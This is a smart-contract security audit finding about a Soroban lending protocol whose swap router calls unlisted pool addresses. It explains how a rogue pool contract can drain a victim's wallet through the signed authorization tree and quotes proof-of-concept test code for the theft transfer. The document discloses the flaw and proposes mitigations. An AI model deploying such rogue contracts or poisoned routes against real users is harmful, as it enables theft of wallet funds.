### Title
Unvalidated swap-route pool addresses let attacker-injected contracts execute a token transfer from the caller's wallet under the caller's own authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The command-injection class — attacker-controlled data reaching an execution sink — maps onto XOXNO Lending's router strategies: the `swap` payload bytes passed to `multiply`, `swap_collateral`, `swap_debt`, and `repay_debt_with_collateral` name arbitrary pool/token contract addresses, and neither the controller nor the router keeps an allowlist of them. A crafted route can place attacker-deployed contract code on the call stack underneath the caller's `require_auth`, where a `token.transfer(victim, attacker, …)` it makes is recorded as a sub-invocation of the caller's authorization entry and executes if the caller signs the simulated auth tree — draining wallet funds far beyond the routed amount.

### Finding Description
Controller strategies forward caller-supplied `StrategySwap` bytes verbatim to the swap aggregator. `swap_tokens` validates only that the payload is non-empty, authorizes exactly one input transfer, and measures balance deltas — it never inspects which contracts the route names [1](#0-0) . The router's `dispatch_hop` invokes whatever `hop.pool` address the payload's `assets` registry supplies (e.g., `invoke_contract(&ctx.hop.pool, "get_reserves", …)` and `invoke_contract(&ctx.hop.pool, "swap", …)`) [2](#0-1) [3](#0-2) . The threat model acknowledges exactly this injection: "a route can put third-party code on the call stack below the caller's authorization … it executes if the caller signs that tree. The loss is then the caller's wallet, not the routed amount" [4](#0-3) .

### Impact Explanation
Theft of user funds. A victim calling `swap_collateral` (or any strategy verb) with an attacker-supplied route — e.g., from a malicious quote, a poisoned routeXdr shared off-chain, or a phishing flow — triggers the rogue pool's `token.transfer(victim_wallet, attacker, amount)`. Soroban's host records that transfer as a child of the victim's auth entry; standard `simulateTransaction` output then includes it, and a wallet that signs the returned tree authorizes the drain. The repo's own PoC shows the victim's unrelated wallet token balance going to zero while the swap itself returns a fair output and the account passes all risk gates [5](#0-4) . Neither the payload `min_out`, the controller's `RouterOverspend`/`NoSwapOutput` checks, nor the post-swap solvency gate bounds the stolen amount [6](#0-5) .

### Likelihood Explanation
Requires the victim to sign a transaction containing a malicious route — a realistic path since routes are opaque XDR bytes produced off-chain and the exposure applies to every `execute_strategy` caller, not just lending strategies [4](#0-3) . The direct-`execute_strategy` user supplies a single signature; wallet UIs typically display only the root invocation, not decoded sub-invocations. Severity Medium: high impact, but conditioned on the caller signing the poisoned tree.

### Recommendation
On-chain, the controller cannot decode arbitrary route semantics, so mitigate at the boundaries: (1) enforce a venue/pool allowlist in the router's program decoder or venue adapters, or (2) have clients/SDKs decode `swap_xdr` before signing and reject any authorization tree containing sub-invocations beyond the expected single input `transfer` (the mitigation the threat model prescribes) [7](#0-6) . Preferably both, since `execute_strategy` is also callable directly.

### Proof of Concept
The repository ships the exploit as a test. `UnlistedPoolRouter.execute_strategy` invokes `route.hop_pool.swap`, and `RogueHopPool` — an attacker-deployed contract whose constructor stores a `(victim, wallet_token, attacker, amount)` plan — calls `token.transfer(victim, attacker, amount)` inside the hop [8](#0-7) [9](#0-8) . With an honest tree the host refuses the transfer and the whole `swap_collateral` call rolls back; signing the simulated tree that includes the rogue sub-invocation executes it, leaving the victim's wallet balance at 0 and the attacker's at the full 77,770 units, while the victim received fair swap output and stayed solvent [10](#0-9) . The same sink exists in the real router: every venue adapter resolves its pool from the payload's `assets` registry with no allowlist [11](#0-10) .

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L55-59)
```rust
    let (reserve_0, reserve_1): (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "get_reserves"),
        no_args,
    );
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L85-88)
```rust
    let _: () = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
}
```

**File:** docs/explanation/threat-model.md (L144-152)
```markdown
Router swaps settle measured input/output changes. The controller grants
one exact input-transfer invocation, not a token allowance, and refunds
unspent input still held by the controller. The router checks its payload
minimum against output after fees but before payout; its own residuals
follow a capped admin-revenue policy. The controller requires positive
measured output and final account risk, not an independent slippage bound.
A compromised router may consume authorized input for dust output while the
final account passes its risk gates. Exposure is bounded by routed funds and
those gates, not by an independent controller slippage limit.
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-47)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-71)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L34-40)
```rust
    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```
